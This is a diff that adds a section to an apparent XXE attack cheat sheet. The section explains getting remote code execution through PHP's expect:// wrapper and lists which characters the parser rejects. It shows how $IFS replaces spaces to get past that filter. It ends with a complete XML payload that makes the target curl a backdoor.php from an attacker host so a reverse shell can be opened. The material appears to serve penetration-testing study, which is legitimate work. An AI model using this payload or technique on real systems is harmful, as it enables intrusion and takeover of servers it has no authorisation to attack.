@@ -621,6 +621,65 @@ Instances where RCE is possible via XXE are rare,
 (<!ENTITY rce SYSTEM “expect://ifconfig” >).
 ```
 
+The idea is that you provide a reference to ```expect://id``` pseudo URI for the XML external entity, and PHP will execute ``id`` and return the output of the command for external entity substitution.
+
+Turns out it was quite a lot of work to get from that to a “useful” code execution. The problem is, PHP’s XML parser will error out if you have spaces in the expect pseudo URI, i.e. when providing arguments for the command. You might see something like this in the error log when trying ```expect://echo BLAH:```
+
+```python
+DOMDocument::loadXML(): Invalid URI: expect://echo BLAH in Entity, line: 2
+```
+
+Firstly, in addition to spaces, the following characters will be rejected with the “Invalid URI” error message similar to above (this might not be an exhaustive list):
+
+```python
+" - double quotes
+{ } - curly braces
+| - "pipe"
+\ - backslash
+< > - angle brackets
+: - colon
+```
+```python
+The following characters work fine:
+
+' - single quote
+; - semicolon
+( ) - brackets
+$ - dollar sign
+```
+This makes it hard to pass arguments to commands, redirect output, or use shell pipes.
+
+When constructing ``expect://`` pseudo URLs for external entity reference in XML you shouldn’t URL encode the string (it is interpreted literally). So using %20 or + instead of space doesn’t work, and neither does XML encoding like ``&#x20;`` or ``&#32;``.
+
+One workaround that `$IFS` built-in variable in sh and relies on the fact that the dollar sign is accepted. The core technique is to replace any spaces in your command with `$IFS`. In some cases this needs to be combined with the use of single quotes when a space needs to be followed by alphanumeric characters (so that they are not interpreted as a part of the variable name). Here’s a couple examples:
+
+``cat /tmp/BLAH becomes cat$IFS/tmp/BLAH``
+
+``echo BLAH`` becomes ``echo$IFS'BLAH'``
+
+`curl -O http://1.3.3.7/BLAH` becomes `curl$IFS-O$IFS'1.3.3.7/BLAH'`
+(: would not be allowed, but curl assumes it is http if you omit http://)
+
+Using these, a possible way to get a reverse shell using XXE would be to upload a PHP reverse shell and then execute it using your browser. (replace 1.3.3.7 with your IP and serve backdoor.php using `python3 -m http.server`
+
+```python
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'1.3.3.7:8000/backdoor.php'">
+]>
+<root>
+  <name>Joe</name>
+  <tel>ufgh</tel>
+  <email>START_&file;_END</email>
+  <password>kjh</password>
+</root>
+```
+
+
+
+
+
+
 # later
 
 
@@ -668,3 +727,5 @@ We sent several XXEA messages to them and tried to read the '/etc/hostname' file
 
 This is due to the fact, that the Web Application was behind a load balancer that deligates the requests to different servers.
 On some of them, the '/etc/hostname' file exists, on other, it doesn't. This is, for example, the case for CentOS Servers.
+
+
